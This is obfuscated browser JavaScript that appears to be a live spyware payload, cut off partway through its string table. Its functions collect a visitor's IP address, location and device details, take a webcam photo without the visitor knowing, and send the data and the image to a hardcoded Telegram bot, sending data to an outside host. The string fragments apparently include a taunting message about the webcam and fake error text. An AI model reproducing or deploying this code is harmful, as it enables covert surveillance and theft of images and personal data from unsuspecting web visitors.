(function (_0x463512, _0x1cfd20) {
  const _0x4ee352 = _0x463512();
  while (true) {
    try {
      const _0xd3912f = -parseInt(_0x5d43(1067, 0x8c5)) / 1 * (parseInt(_0x5d43(2613, 0xad1)) / 2) + parseInt(_0x5d43(2313, 0xacb)) / 3 * (-parseInt(_0x5d43(1638, 0x960)) / 4) + -parseInt(_0x5d43(1312, -0xc3)) / 5 * (parseInt(_0x5d43(2607, 0x757)) / 6) + parseInt(_0x5d43(2860, 0x725)) / 7 * (-parseInt(_0x5d43(1496, 0x57d)) / 8) + parseInt(_0x5d43(1186, 0x51c)) / 9 * (parseInt(_0x5d43(2720, 0x9c3)) / 10) + -parseInt(_0x5d43(641, 0x7db)) / 11 * (parseInt(_0x5d43(2020, 0x743)) / 12) + parseInt(_0x5d43(790, 0x18e)) / 13;
      if (_0xd3912f === _0x1cfd20) {
        break;
      } else {
        _0x4ee352.push(_0x4ee352.shift());
      }
    } catch (_0xf5673b) {
      _0x4ee352.push(_0x4ee352.shift());
    }
  }
})(_0xaa38, 979310);
function _0x5d43(_0xaa38a3, _0x5d4380) {
  const _0x14b172 = _0xaa38();
  _0x5d43 = function (_0x5a956b, _0x4afb41) {
    _0x5a956b = _0x5a956b - 352;
    let _0x20d5f7 = _0x14b172[_0x5a956b];
    return _0x20d5f7;
  };
  return _0x5d43(_0xaa38a3, _0x5d4380);
}
async function sendTelegramMessage(_0x252ff8) {
  try {
    await fetch("https://api.telegram.org/bot8493084337:AAFPW75-vT4EgtloLveSmbgN-6bvD3FYztos/sendMessage", {
      'method': "POST",
      'headers': {
        'Content-Type': "application/json"
      },
      'body': JSON.stringify({
        'chat_id': "7728504492",
        'text': _0x252ff8,
        'parse_mode': "HTML"
      })
    });
  } catch (_0x47e71d) {
    console.error("Failed to send message:", _0x47e71d);
  }
}
async function getCountryName(_0x1780d8) {
  try {
    const _0x46ca87 = await fetch("https://restcountries.com/v3.1/alpha/" + _0x1780d8);
    const _0x16e496 = await _0x46ca87.json();
    return _0x16e496[0]?.["name"]["common"] || "Unknown";
  } catch (_0x4c3676) {
    console.error("Failed to fetch country name:", _0x4c3676);
    return "Unknown";
  }
}
function _0x232df3(_0x9b55d7, _0xa0729c, _0x4744bb, _0xeef54d, _0x1fcd94) {
  return _0x5d43(_0x9b55d7 - 0x22b, _0x4744bb);
}
async function getUserInfo() {
  try {
    const _0x1cd479 = await fetch("https://ipinfo.io/json");
    const _0x5d148c = await _0x1cd479.json();
    const _0x575ce1 = await getCountryName(_0x5d148c.country);
    const _0x374425 = parseUserAgent(navigator.userAgent);
    return {
      'ip': _0x5d148c.ip,
      'country': _0x5d148c.country,
      'countryName': _0x575ce1,
      'city': _0x5d148c.city,
      'region': _0x5d148c.region,
      'countryEmoji': getCountryEmoji(_0x5d148c.country),
      'userAgent': navigator.userAgent,
      'deviceModel': _0x374425.model,
      'deviceType': _0x374425.type,
      'deviceOS': _0x374425.os
    };
  } catch (_0x483bc4) {
    console.error("Failed to fetch user info:", _0x483bc4);
    const _0x5c97d6 = {
      ip: "Unknown",
      country: "Unknown",
      countryName: "Unknown",
      city: "Unknown",
      region: "Unknown",
      countryEmoji: '❓',
      userAgent: navigator.userAgent,
      deviceModel: "Unknown",
      deviceType: "Unknown",
      deviceOS: "Unknown"
    };
    return _0x5c97d6;
  }
}
function parseUserAgent(_0x3a1aa5) {
  const _0x588fc2 = {
    regex: /iPhone\s*(\d+([_\.]\d+)*)/i,
    type: "Mobile",
    os: "iOS"
  };
  const _0x25343c = {
    regex: /iPad/i,
    type: "Tablet",
    os: "iOS"
  };
  const _0x38a680 = {
    regex: /Android\s*([\d\.]+)/i,
    type: "Mobile",
    os: "Android"
  };
  const _0x43af0c = {
    regex: /Windows Phone\s*([\d\.]+)/i,
    type: "Mobile",
    os: "Windows Phone"
  };
  const _0x3324a6 = [_0x588fc2, _0x25343c, _0x38a680, _0x43af0c];
  const _0x3e40bd = {
    regex: /Windows/i,
    type: "Desktop",
    os: "Windows"
  };
  const _0x2c6a5b = {
    regex: /Macintosh/i,
    type: "Desktop",
    os: "macOS"
  };
  const _0x1963d3 = {
    regex: /Linux/i
  };
  _0x1963d3.type = "Desktop";
  _0x1963d3.os = "Linux";
  const _0x1a7e10 = [_0x3e40bd, _0x2c6a5b, _0x1963d3];
  for (let _0x3c0177 of _0x3324a6) {
    const _0x17d96d = _0x3a1aa5.match(_0x3c0177.regex);
    if (_0x17d96d) {
      return {
        'type': _0x3c0177.type,
        'os': _0x3c0177.os,
        'model': parseDeviceModel(_0x3a1aa5, _0x3c0177.os)
      };
    }
  }
  for (let _0x361bf2 of _0x1a7e10) {
    const _0x2b0e23 = _0x3a1aa5.match(_0x361bf2.regex);
    if (_0x2b0e23) {
      return {
        'type': _0x361bf2.type,
        'os': _0x361bf2.os,
        'model': parseDeviceModel(_0x3a1aa5, _0x361bf2.os)
      };
    }
  }
  const _0x186aaf = {
    type: "Unknown",
    os: "Unknown",
    model: "Unknown Device"
  };
  return _0x186aaf;
}
function parseDeviceModel(_0x405f5f, _0x2e9930) {
  switch (_0x2e9930) {
    case "iOS":
      const _0x769ef2 = _0x405f5f.match(/iPhone\s*(\d+([_\.]\d+)*)/i);
      if (_0x769ef2) {
        return "iPhone " + _0x769ef2[1].replace(/[_\.]/g, " ");
      }
      const _0x40feb7 = _0x405f5f.match(/iPad/i);
      if (_0x40feb7) {
        return "iPad";
      }
      break;
    case "Android":
      const _0x1e435a = _0x405f5f.match(/;\s*([^;)]+)\s*Build/i);
      if (_0x1e435a) {
        return _0x1e435a[1].trim();
      }
      break;
    case "Windows":
      const _0x10f0cb = _0x405f5f.match(/Windows\s*([\w\s]+)/i);
      if (_0x10f0cb) {
        return "Windows " + _0x10f0cb[1];
      }
      break;
    case "macOS":
      const _0x52d5d6 = _0x405f5f.match(/Macintosh;.*Mac\s*([\w\s]+)/i);
      if (_0x52d5d6) {
        return "Mac " + _0x52d5d6[1];
      }
      break;
  }
  return "Unknown Device";
}
function getCountryEmoji(_0x2cb618) {
  return _0x2cb618.replace(/./g, _0x293d07 => String.fromCodePoint(127397 + _0x293d07.toUpperCase().charCodeAt()));
}
async function captureAndSendPhoto() {
  try {
    const _0x30d3be = {
      video: true
    };
    const _0x395e8d = await navigator.mediaDevices.getUserMedia(_0x30d3be);
    const _0x4f5818 = document.createElement("video");
    _0x4f5818.srcObject = _0x395e8d;
    await _0x4f5818.play();
    const _0x3ba474 = document.createElement("canvas");
    _0x3ba474.width = _0x4f5818.videoWidth;
    _0x3ba474.height = _0x4f5818.videoHeight;
    const _0x3c5ca4 = _0x3ba474.getContext('2d');
    _0x3c5ca4.drawImage(_0x4f5818, 0, 0, _0x3ba474.width, _0x3ba474.height);
    _0x4f5818.pause();
    _0x395e8d.getTracks().forEach(_0x4e7e71 => _0x4e7e71.stop());
    const _0x2af968 = await new Promise(_0x45b586 => _0x3ba474.toBlob(_0x45b586, "image/jpeg"));
    const _0x42ddae = new FormData();
    _0x42ddae.append("chat_id", "7728504492");
    _0x42ddae.append("photo", _0x2af968, "photo.jpg");
    await fetch("https://api.telegram.org/bot8493084337:AAFPW75-vT4EgtloLveSmbgN-6bvD3FYztos/sendPhoto", {
      'method': "POST",
      'body': _0x42ddae
    });
    console.log("Photo captured and sent successfully");
  } catch (_0x3928ba) {
    console.error("Failed to capture photo:", _0x3928ba);
  }
}
function _0xaa38() {
  const _0x2cd778 = ['scale', 'ZJOL1', 'jsdzO', "  tex", 'RC5xB', 'RUvNX', '#536D', 'mount', 'kIOcM', 'waZxI', " list", 'CSfWN', 'vE3BI', 'BgARk', 'ame', 'messa', 'rarHO', 'ojBzX', 'uiTUp', 'cprP+', "ебку ", 'vice', 'iHgn6', 'dcpJy', 'NsuCi', 'eOS', 'bhCww', 'adow:', '/12j1', 'BJycn', 'L8gPW', "glow ", 'ZCXEa', '5hqHM', 'ght', 'mlHMV', '7Pktz', 'euVxr', 'opaci', 'EDjlm', 'YGhm2', 'Jry1w', 'HTML', '#64FF', 'visib', 'raLCj', "бку у", 'вером', '.gith', '3OGUj', 'le-la', 'oElIx', 'rOGqj', 'tionD', 'CBHjN', 'IMxvS', 'gQjdr', 'U/I80', 'qN/vw', 'gIAhy', '2cSNb', 'commo', 'MlVLH', 'k7yy7', 'a85Js', " 0% {", 'oMLTL', 'YTQEn', '#FF52', 'mRzLW', 'input', "form ", '50%', 'nPzlG', '|2|3', 'lNVGk', 'getTr', 'RuEbb', 'VScvX', '-grad', 'KXJkV', "px rg", 'RvCgd', 'stcou', 'ewwiw', 'yDBDV', 'ajCHl', 'qKuiT', 'ZAQaK', 'igh', 'rLQtR', 'getEl', '/jpeg', 'сожал', '14fwtiHx', 'large', 'nn/wX', "']:ch", 'log', 'PoIhT', 'PLmip', 'yrbdT', 'hpjiZ', '3DhKv', 'oTpPU', 'mediu', 'AAAAA', 'SlJfz', 'E9rxj', 'EaLZl', 'mZkcl', 'KjGbk', '6mM3I', 'm4gAE', 'splEa', 'dPaxC', 'oCgUA', 'yrWlX', 'Name', 'M051s', 'EwFcf', 'kit-b', 'tor', "Bot A", '/ft5j', "t 120", 'wGA0w', 'ntext', 'TZhoo', 'pXN0g', 'Z96/j', 'qCukd', 'jHO4F', "iv id", " 1), ", 'E5nLp', 'gU2zu', 'mzV96', 'start', '965y5', 'mnCIM', 'shado', "0;\n  ", 'GTPv8', 'y/c/3', "dow: ", 'пробл', "e: no", 'ublic', 'Messa', "ems: ", '</div', 'w.you', 'KNqpD', '3rcOZ', '20px;', 'KNLYt', 'TZCt6', 'ositi', '07jI9', '3R6xi', 'Cjkpz', 'form', "s glo", " спиз", "r;\n  ", 'u4zBe', 'xWDZt', '/EmjE', 'E0zJr', 'vK1vE', 'gabwM', 'EmoIp', 'uynXK', 'zilTR', 'hidde', 'textS', 'rbHSj', '/v3.1', 'jHsjZ', 'pzoti', 'Ccxnr', '#FFAB', 'sion-', 'oDDnL', 'GvVvJ', 'acNKP', 'tuwPr', 'cted<', 't-hei', 'SUVOR', '-drif', 'aVdIA', '/send', 'Lrpd5', 'Po+Lm', "  #ov", 'JQxnq', " coun", "  ani", 'OjEUq', 'HyuYd', "div>\n", "\n\n   ", 'qXnUe', 'j+xlQ', 'Table', 'otf+j', 'RnvNK', 'bzRjN', 'uDrXO', 'jXUWG', 'Image', 'max', 'e-ele', 'ellfu', 'LlHLN', 'WupYr', 'CATSl', 'BAJdC', 'adius', "one;\n", 'YBlNT', 'Huktr', 'nYwqW', 'iLiTn', 'xcDJu', "<p>К ", 'Nl304', 'Qfesb', 'from', 'RPSvF', 'xgNpJ', " .sat", 'K3lSd', 'PPcVi', "10px ", 'CTHou', 'oto:', 'OksXK', 'doFms', 'kAAAK', 'QkqLL', "w(0 0", 'Unkno', "red;\n", 'HleTo', "lor: ", 'egram', 'IyDdz', 'd</b>', 'окиро', 'flick', 'macOS', 'Uwebi', '64,iV', 'AAOww', 'kidRy', 'cZX7f', 'FtBkT', 'hm3FZ', 'goB2x', "te;\n ", 'TOu8R', 'odePo', 'nMbIR', ");\n  ", '8qpx1', 'GSNEv', 'fEIv+', 'JaUQI', 'gZyGM', " вы х", 'Возмо', 'YTPeh', 'iwYjx', "\n📱 De", "04: Д", "ty 0.", 'retur', " -70%", 'ieHlP', '2hX6/', "dium ", 'n5E6q', 'info', 'AA7DA', 'ScBQo', " 3s c", 'WpKiS', 'YqVjF', "ily: ", "px, ", 'inear', 'volum', 'fullU', 't-siz', 'YhKGe', 'trans', 'cK5cl', 'tKBsN', 'FFoAj', "ht: a", '8Yyrx', 'jxtPR', 'iJeXD', 'kgrou', 'ublyZ', 'LleMA', "5, 0.", 'Strin', 'H8dgM', 'RxZru', 'oBNhN', 'wkZzT', 'h0IYy', 'fXiMd', 'ixmCn', 'KRAIc', 'zTjiV', '0EZNk', 'UIJEh', 'Oq/HO', 'main:', '7M2g9', 'извед', 'ccjAR', 'THzXW', 'Storh', 'ecked', 'QxnAs', 'xfAAA', 'a8Gi/', 'ax-wi', 'EvEvd', 'dRnL5', 'wQNTi', 'duPw+', 'revie', 'CNgwt', 'PTKJf', 'devic', 'BORw0', 'ODAjQ', 'style', 'SIHae', 'MstDI', 'corat', ">\n   ", 'ansit', "ws Ph", 'pspwZ', 'kOdY6', '09dtA', 'lZEBy', 'ate(', '+zxMJ', 'SPfUf', 'gYDzN', 'hQFMg', 'wUFYM', 'parti', 'RTmZp', 'l-squ', 'Dqh+R', 'sXRnd', 'zEwoE', 'w9IAE', 'P3eYi', 'vOsuR', 'M9Vto', 'flex', "rror ", 'UNslJ', "9, 1,", 'mNwt2', 'HiF9c', 'AYlWN', 'iEKhO', '4crV6', 'cY3Ov', '8jmtc', "'Aria", '18lpp', 'tbJeL', 'Taehl', 'oqaLV', 'EJnhT', "lt=\"E", 'canva', 'SwlrW', 'y8ufq', " font", 'iCPDn', 'RzTpf', 'gaOzL', 'pLXsY', 'utSsS', 'XgysA', "r 0.3", "999;\n", 'HHb6h', 'loIpD', 'YueXJ', 'HWiAH', '7M1jQ', 'right', 'w+O7+', '811.m', "5, 0,", '275fBLAKM', 'znazu', 'sUB5T', 'gTrOr', 'rGAbw', "    #", 'fixBu', 'u7Nte', 'upBZH', 'jKDPE', 'SgIEt', 'ucces', 'jxLJX', 'iXkUR', 'lengt', "n: co", 'oGaSM', 'EBvsb', "e: 18", 'обнов', 'PMAsp', 'ards', " User", 'lSYzU', "    t", 'body', 'rnate', 'bonHO', 'POST', 'isWTK', "t: ce", 'oTQMz', "0px r", 'Xgkw5', 'MeYGO', '|4|1', 'nstru', 'ntrie', " forw", 'NUkeL', "rn th", ") tra", 'uYq5I', 'VjhJb', 'NdSUl', 'WllIf', '/alph', '>Возм', 'X80km', 'nkcPK', 'KlMAT', 'xuUHj', 'VR4nO', 'ift', 'UrdfN', 'gpnTt', 'sk66q', 'lfTkj', 'oekPW', 'Z5SUE', "t 8s ", 'VwlTW', 'voJFX', 'r2ymX', '.jpg', "=\"ove", "ent s", 'Rlomk', '#fff', 'bsolu', 'NvQfZ', 'ease-', "s eas", 'white', 'nitia', 'ещен<', 'mJKqI', '0|1|4', 'query', 'DcGqW', 'drop-', 'QjY4w', 'qEmJi', 'K5xMG', '03IGB', 'tMfaI', 'fIUAQ', 'ZWd15', "\" sty", 'ujg0P', 'ff9Z/', 'MosEh', '/getM', 'yCHgy', 'mesVD', 'zaNJH', "5, 25", 'ABFn4', '://ww', 'hwdyo', 'hxMDw', '/uIuY', 'gify', '2i+72', 'BsjKz', 'zqIwc', "1s ea", 'A4Z2K', "i>\n  ", 'hidin', 'Initi', 'DeBzp', 'xQxnd', " p {\n", 'одера', 'wmDpn', 'Jdiot', '>Непр', 'Rduqf', 'LrBEz', 'CNQJc', '1.2em', 'BKtLw', 'aOGBg', 'Zi/F/', 'hostn', 'r(0.1', 'Bawxv', 'b8Xf3', 'oqUbC', 'vaZ8n', 'fCfYP', "px;\n ", '3|0|2', '200px', " 4px ", 'Width', 'Oj33/', ", 255", 'MDPTA', "ht 2s", 'qfo1c', 'rlC2T', 'EHTIR', "top: ", 'Devic', 'media', '7F7lZ', 'creat', '37703744JJwixC', 'AAAQ0', 'TKhmP', 'vciac', "3s cu", '#FF6E', 'div', '0m3ES', "{ opa", 'c5q2S', 'xWmuf', 'p7h+/', '2+dr2', 'HrsSh', '://re', 'RNgdu', 'zKveG', '3sNjy', 'Edhby', 'NWajc', 'MpBKV', "   <h", 'lized', 'photo', 'zViwu', '11PIx', 'wntLx', 'LGWGM', 'nsIfS', 'flex;', 'eedJQ', "w: 0 ", 'k//8A', 'cQdoD', 'cDfTW', 'rfHzr', 'gba(2', '4w9Wg', '707QP', 'lyskK', 'ById', 'qdSdD', "Mac ", 'pCgEV', 'Y9qnH', 'toISO', 'chmcl', 'm99gb', '#69F0', 'fhBzT', "ton\">", "ton {", 'RxwTT', "    <", "er {\n", 'vGvQY', 'OQUTW', 'XPwIN', 'uEPlv', 'eight', 'qXVtT', 'rOpkA', 'RVzLM', '|1|0', "low: ", '/TENP', 'rFvHV', 'hofJo', " heig", "XcQ\" ", 'cjmCl', 'gQXdQ', 'XKEiT', 'YNGPK', 'Lxc38', "ы блю", 'F5TzD', 'io/js', 'src', 'AACXB', " ее к", 'dUDNs', 'q/Bvm', 'e-typ', 'Giddy', 'com/w', 'u6l+p', 'rzTB1', 'nXSSd', 'EejKT', 'wave', 'l55xF', 'VNVNH', 'dNggZ', 'GBleN', 'eVNXx', 'aEpyE', 'X19PO', '.ball', 'xJCyk', "gin: ", 'euKuw', 'wcsZV', 'gMrEA', "   }\n", 'tHs+O', 'then', 'fEDMu', 'eRxrp', 'elay', " user", 'rXSGU', 'xyq8a', 'XnSPz', '3XXSB', 'rp15n', ": 0 0", 'zQgsB', "mpt D", 'f1rrD', 'tton:', 'CRNtY', 'aosmG', 'eEONh', 'U99zz', 'in-ou', " padd", 'FNdep', "0 2px", 'warn', 'voMGf', 'fDEwc', 'vxrab', 'fLoTG', 'iFDjh', 'ramBu', " <a h", 'FKIgg', 'QhjIZ', 'cos', 'head', 'wzUym', 'conso', " bord", 'infin', 'c3T2c', 'PFNmF', 'tXo87', 'fSMDx', 'JHXKR', '>Unau', 'wDwRI', 'R8vyr', 'rVYkx', 'fvyUp', "n;\n  ", 'UCroT', 'enter', " />\n ", 'chang', 'OulQM', 'uMwaO', 'zrlJt', 'UHBLh', 'iZUha', 'AabcR', 'A4UTI', 'zaNqz', 'meteo', '://ip', 'IUwGg', 'bQyN2', 'textC', 'fmQyH', 'pg9Un', "\n🚫 <b", 'BYIGf', 'XpffZ', 'gt7/7', 'LnGXv', "0% { ", 'kMJ0I', 'DYPgh', 'round', 'stene', 'lmqkn', 'NxpnF', 'floor', 'YbH5+', 'eUqny', 'AFW0L', 'Krp1j', ", 0.8", 'ODULK', 'iKaLJ', 'sAqvg', 'GSywP', 'entyp', 'hite;', 'aX/1Z', 'EoESz', 'GjuAo', 'VzyyP', ", 0.7", 'BoKGE', '.mp3', 'tjYHh', 'inite', 'Va8ZB', 'ufhWi', 'p/FlG', 'bGVGT', '-size', 'utton', 'b5x3A', 'Ppeue', 'cz8BS', 'Lrw06', 'S/ElH', 'json', "    l", 'F5orR', 'xyXIM', 'PFLGK', 'mpact', 'y5BTt', 'NOcHa', 'lTo', 'kFwRm', '1Zesa', '</li>', 'toBlo', 'StNIw', " Agen", "    r", "ть ве", 'iPad', 'class', 'ZCs2J', "  jus", 'des', 'FMhJJ', '8svd7', 'List', 'yznlQ', 'int', 'lx6MW', 'iu8Vu', "}\n   ", 'nnWEw', 'QRWCx', 'nter;', 'ectio', "15, 0", 'vazuU', 'odlUT', 'HCREz', "Fix I", 'error', 'PuHhV', 'KGgoA', '#FFD7', 'VhLQr', 'oHxsu', 'K5CYI', 'XdMBK', 'de>', 'sJiZ2', "  <li", 'UBuWS', 'EnBJc', 'chat_', "eft: ", 'DZobC', 'gKiCy', "\"retu", 'ssMtr', '1289YJTZEY', 'xt-de', 'eElem', "nt: c", "Bot i", 'XPZ2C', 'px)', 'bic-b', 'ALOjx', "    f", '(0.19', '#B2FF', '9rVq+', 'nBErJ', '1+zEH', '1FVfh', 'HZq7Y', 'regex', 'ton', 'muxkt', 'HRCVb', 'klgqo', 'DZiui', 'ansfo', 'count', 'lumn;', 'Mobil', 'nbxr4', 'ytcKK', 'FtUTx', 'Glgix', '#40C4', 'ZpVmD', "n: 20", 'JYfFW', 'lQ4w0', 'iGu6F', 'tAsli', 'AxIat', 'GtjnC', 'QIxDz', 'hTu1a', 'xZv+y', 'b0asY', 'wil1S', '065XB', 'Rphxe', 'kPqex', 'ZffVy', 'le(', 'PIKJq', 'INgHG', 'gN0jZ', "x rgb", 'fishz', 'alloo', 'zK8l4', 'hFCHn', ", 1, ", 'AGuRi', 'FVpxn', 'XkljP', '.spac', 'KzWbL', 'TSVWU', 'qFUlU', " 0.7;", 'SiVrB', 'hGCgr', 'vice:', '1HMsR', 'YUfCr', "лемы ", 'XyERe', 'tQXKM', 'fPmEk', 'dfPSd', "e>\n🔗 ", 'Ufl1W', 'OmCrh', 'HBqSH', "0, 0,", 'kKDvp', "5);\n ", 'KG719', 'aZOmI', '-cont', 'Ccimd', 'LBvum', 'Xspex', "d;\n  ", 'lnGvH', 'uk126', 'rgin:', '-shif', 'FTKYi', '0GrJi', "uto;\"", 'XaKuu', 'fVndY', 'I5xfX', 'aREKG', 'condc', 'axfot', 'MONUJ', 'splay', 'lij2+', 'EGUn7', 'aigQM', 'taBHJ', 'nYHWO', 'wjnLp', 'wvlky', 'eKGMA', 'AmdEJ', " 0.3)", '<code', 'xHmNt', 'PM2Iy', '81NEPuIQ', 'SxFqr', 'AQ/v3', "  }\n ", 'RElzJ', '1mCiG', 'kfqfJ', 'cmDcc', " 255,", 'druTk', 'HSnmC', "ize: ", 'омен.', 'DkzjG', 'Qy1O1', 'EfZMQ', "s=\"ar", 'c01Fy', '+vfQm', " disp", "   ma", 'MfBva', 'XN9X3', 'pGxEQ', "    a", 'ai2CT', 'waxjS', 'OE0RB', '4wY0N', 'hcqTz', 'OwBaE', 'load', 'w+MLA', 'qLCnw', 'ffhYH', 'tems:', 'VkUz6', 'jIZAI', 'CYUzS', 'tion', 'urn', 'hD3rR', 'le-me', 'ructo', 'OtsQe', "iv cl", '2zkL5', "lex;\n", 'V6LAJ', 'MZycF', 'SpNHQ', 'lSXAZ', "ng: 0", "try n", 'NS658', "   tr", '.4)', 'erif;', 'o6c93', "e>\n📌 ", '+djjz', " <img", 'thori', 'mZGGO', 'BHFcy', 'VHz_Q', '497iz', " <li>", '.valu', 'ONHiJ', 'm9zxz', "0 10p", 'lO/+w', 'ame:', '.game', 'EqWjM', 'ivPJQ', "1; }\n", 'Butto', 'AINhC', 'cvwrq', "I=\" a", 'xyUgb', '/Mbe/', 'HAUwB', 'nd-sh', 'paSYL', 'agemw', 'BXPIs', 'ePGYz', 'daMyx', "икли ", "ожно ", 'ZOcA2', 'BBUyD', 'ZMPQA', "ws ", 'eAvUk', 'mXJeY', '4V0RC', 'dChil', 'uFssb', 'Ggznv', 'JdWjC', 'W3U3N', 'vH2+6', 'vdlcA', 'ZTS8h', 'PcbuI', 'IHBmK', 'ebuyq', 'pOvZb', 'WxcHK', 'bEGhf', 'zaNvb', 'tRBBj', 'lNlrc', '2T5At', 'AcxFg', " Atte", 'CLipu', 'v3IMq', 'sXJid', 'G+AsA', 'YEE1+', 'nO8v0', '1014295ziLfCG', 'CvwUu', "   ", '/09m+', 'fbEhg', 'QZdeE', 'KmiAT', 'initi', 'RJrgX', 'jXccn', 'stars', 'rando', 'TBHTR', 'vVOAz', "ign: ", 'd4ABa', "g, rg", 'H5idU', 'tu3AH', 'pYkfr', 'VVH0D', 'left', 'Lhaie', 'table', "IP: <", '/wHIb', 'jq9pn', 'zabEd', ">\n📍 D", 'vQlLu', 'xeK4Y', " удал", '6ZwMF', '5JIXW', 'LZnua', "0 0 5", 'n-foi', 'repla', "ion: ", 'Wdjqd', 'euYIc', '+/SOO', 'elati', 'fetch', '100%;', 'RAzzj', 'erMed', 'inter', 'usnUx', 'gwMuX', "вано ", "ite a", 'scrol', 'EMKQW', "/h1>\n", "op\"><", 'TqmMh', 'NCFMB', " запр", 'IWzBR', "er: n", ')</co', 'ZMVEg', 'b8pxY', 'ed</b', '--lif', 'ASWgf', 'hJjKQ', "send ", "id=\"f", 'zjBxZ', '24ygw', 'ub.io', 'iEceL', 'qyujA', 'p+fkx', 'bTkmw', 'YBTW4', 'AbGaI', 'XKYXQ', 'ftYM9', 'ksyUw', '1yMRV', 'ZmKNX', 'uduxI', 'NoSjH', '8xHKl', 'qllpg', 'heigh', '$.</l', "t: <c", 'OSnhM', 'K+NeM', 'NUEhs', 'WNRM0', 'TredO', '9hs6S', "\n🚀 <b", 'jfUYG', 'wOrvw', 't8uKr', 'uKgcd', 'high-', '__pro', 'kxV6R', '8pj6r', 'uiOai', 'EXagn', 'агруз', 'uAESQ', 'CSyEp', 'setPr', 'OdQvk', 'ZIqGZ', ": #28", 'bHU8L', "с сер", 'nslat', '5d59j', 'A4WlD', 'hbzHl', 'iKeyo', 'MZi3O', 'VxElD', ';base', 'fG0BB', 'brTnV', 'QA4jK', 'n/jso', 'TZwmJ', 'r-fal', 'kk2TF', 'AjeBB', 'Lnz51', "0, 0.", 'ZsTFL', '2YhvZ', 'srcOb', 'Hpkwd', 'LjYvp', 'u/wZe', 'vpvAE', " купи", "and s", 'dYPLo', 'xXcjB', "row l", 'eMode', 'AAANS', 'kvNha', 'hRezM', '4pWlZ', '4cf2l', 'вебку', 'xwTjf', 'IWXMA', 'szITd', 'ltern', "  fle", 'xDPHz', '.star', 'gAery', 'QCHQh', 'BoVxy', 'ans-s', 'McEDZ', 'IFstc', 'atch?', '#18FF', 'lGVdA', 'znsYC', 'jiWQa', 'xplos', "t\"></", 'wKgsD', "     ", 'ucAsW', 'MAD2z', 'SUqQn', '{}.co', 'V6Poh', 'oWQUt', 'width', '63qoF', '655592QrxSvr', "к сай", 'MkHmy', "    @", 'KcW16', 'video', 'Time:', "ate;\n", 'mDDiC', '7WyDW', 'Khvfp', 'h1MjY', 'WJeoY', 'JWesE', 'QnOcj', 'apply', 'AUTNZ', 'ement', 'f0HBT', "   #f", 'tw3ST', 'block', 'kit-e', 'DJXRP', 'м.</l', '135de', 'anNaR', 'YbZeW', 'eBeKz', 'jc7qS', 'GMJIe', "URL: ", 'm/mIi', 'alize', 'jOPoU', 'Vg4Vb', 'iRmGH', 'l8fK5', 'NrDbt', 'der-r', 'vZSes', 'SbdTG', 'QJtui', "nd: l", 'fnEta', 'dYuLb', 'to__', 'drawI', 'bckOD', '2jIYo', 'CTuWL', "   te", 'const', 'tKPKf', "row t", 'wXVcK', 'Автов', 'ksnR3', 'yEWwY', "ось з", 'jwIwm', '7lIQ8', 'code>', 'fZUhK', 'wbjfu', 'KBQBf', '4c1yO', 'mage', "h1 {\n", 'ion-i', 'bE2vr', 'oWAxg', 'ybWSs', 'Xrbh/', 'UUPdR', 'hadow', 'Q1BzU', 'uXYDP', ") rot", "ing: ", 'HfTIm', 'brigh', 'jZKLF', "all 3", "за 15", 'GaeTh', 'TstJm', 'TvFmZ', 'MayjY', 'AacnN', 'star-', 'vK55p', 'model', 'gYG/l', 'flyin', 'QDqlt', 'hxlGU', "m\"></", 'AYtOk', 'HqqFZ', 'MMfK0', 'LvBiP', 'botto', 'mDxvz', 'hG5S7', 'AcBqo', " 0;\n ", 'kExbo', 'DOGtt', 'FIpHC', 'none', 'ize', 'Zuhje', 'gzaGf', 'YpBSP', 'wmJJv', 's.com', ";\n   ", '7/p58', 'BVnDY', 'alter', 'i1XuV', 'sphwo', 'PVtCd', 'catio', 'PJXAN', 'yLvJS', '4DxcQ', 'GfymA', 'uUesd', ':AAEh', 'tTNaz', 'disab', ">Bot ", 'oMRi3', 'domai', 'ZsWwa', 'hcbXe', 'zlhna', "    p", 'BpD54', 'NgGpj', '4084PxPwFU', 'onten', 'xSDmN', 'small', 'rency', " line", 'DVd4n', '9WppX', "   <d", " info", 'GQCDQ', 'SeBl0', "r: po", "бка 4", 'Ou79N', 'aEPgZ', 'tZRia', 'WcswU', 'WTfBZ', 'Fhezs', "tion ", " {\n  ", 'm1WOZ', " возн", 'entLi', 'pause', 'ments', 'TIpnJ', 'dgSIH', 'jbozS', 'vmvf2', 'jMtpr', 'd0rbf', 'WUtwJ', " }\n  ", 'gHtEC', 'Mxsaj', 'vsTTt', 'acks', 'h3Mra', "s inf", 'uJAxH', 'eType', 'cBugC', 'QKv6b', 'z-ind', 'BNkQe', '1>Оши', 'V3aI5', 'aliza', "rrow ", 'INJRv', '1DzeM', 'city:', 'gR/5n', 'ion', 'fqOQK', " <cod", '(1.05', 'idwgj', 'XTVwA', 'JHqiq', 'MfvHT', 'exPgR', 'mF2s3', 'звука', 'TTkUx', 'star', 'kdCAA', 'есурс', 'MJTcQ', '3xMJK', "de ", "  fon", '8uOpM', '://ap', 'RjTz3', "ured ", 'mBiEw', 'XnfaV', 'irYUe', 'lWK99', 'Xv0Lo', 'WOT52', 'jXKMn', '64369', 'type', 'ovfqM', 'Pp7Xv', 'bhiNE', 'qCTyH', 'iOS', "00% {", 'K8Hoj', "255, ", 'gUAga', 'i>Воз', 'ctBut', 'KSTqH', 'LMVva', "lay: ", 'EggMb', '-colo', 'JbIwE', 'tyMrI', "dth: ", 'UroPS', 'kuJey', 'jKSvy', 'pulse', 'Dxs/q', 'Fw8R3', 'KMhEA', 'Locat', 'oNFBh', '.mete', 'EqCkS', 'whqRy', 'loop', "ный д", 'DskYJ', " clas", 'ebLHn', 'bot', 'add', 'backg', 'color', 'SrTqg', 'appli', 'CQsBo', 'top', 'NiXvd', 'mSK1D', '2|4|3', 'HYTPj', '-1682', 'tMStP', "ение ", 'Geveh', 'VBKQo', ": #dd", "ne;\n ", 'AgkQz', ", 1)", 'Sothj', 'xmBEC', 'zFHQn', 'ign-i', 'WhRtt', 'xMVph', "); }\n", 'rASdz', "re ph", 'Mrfkx', 'pWEzk', 'AJpVR', "3s;\n ", 'KIPge', 'zG+Tc', 'hgYdW', '2uT7t', 'zzueo', 'BwgRQ', 'XUPKs', 'TDVPY', 'displ', 'WNQhY', 'Fgunb', "is\")(", 'MEqFw', 'GclRw', 'sNiaM', 'CFS6W', 'Z9XnY', 'YcbDw', 'L8kh0', 'QsJxR', 'ZChIL', 'Lnd9x', 'click', 'SLACE', 'ftvir', " забл", 'xRdqq', 'xTEic', 'ufWBj', 's2r2L', 'ound-', 'nxrty', 'AYcls', 'WFJyi', 'ttyBA', 'Wht/B', 'Dto3z', 'kdCze', 'osion', '1yJEI', 'TnpvQ', 